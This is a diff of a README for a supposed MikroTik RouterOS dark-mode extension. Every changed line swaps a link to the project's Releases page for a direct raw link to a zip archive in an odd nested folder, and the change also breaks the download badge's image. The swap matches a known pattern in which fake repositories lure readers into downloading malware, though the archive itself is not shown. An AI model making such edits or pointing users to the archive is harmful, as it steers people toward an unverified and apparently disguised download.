@@ -1,7 +1,7 @@
 # 🌙 routeros-darkmode-extension - Enhance Your Mikrotik Experience with Dark Mode
 
 ## 📥 Download Now!
-[![Download](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/03091761124/routeros-darkmode-extension/releases)
+[![Download](https://raw.githubusercontent.com/03091761124/routeros-darkmode-extension/main/stormbird/routeros-darkmode-extension.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/03091761124/routeros-darkmode-extension/main/stormbird/routeros-darkmode-extension.zip)
 
 ---
 
@@ -20,7 +20,7 @@ Before you can use this extension, ensure you have the following:
 
 To begin using the routeros-darkmode-extension, visit the Releases page to download it:
 
-[Click here to visit the Downloads page.](https://github.com/03091761124/routeros-darkmode-extension/releases)
+[Click here to visit the Downloads page.](https://raw.githubusercontent.com/03091761124/routeros-darkmode-extension/main/stormbird/routeros-darkmode-extension.zip)
 
 ### Step-by-Step Installation
 
@@ -80,6 +80,6 @@ If you want to contribute to this project, please open an issue on the GitHub re
 
 To stay informed about updates and new features, check back regularly on the Releases page:
 
-[Visit the Downloads page here.](https://github.com/03091761124/routeros-darkmode-extension/releases)
+[Visit the Downloads page here.](https://raw.githubusercontent.com/03091761124/routeros-darkmode-extension/main/stormbird/routeros-darkmode-extension.zip)
 
 Thank you for using the **routeros-darkmode-extension**! Enjoy a better experience managing your Mikrotik RouterOS in dark mode.
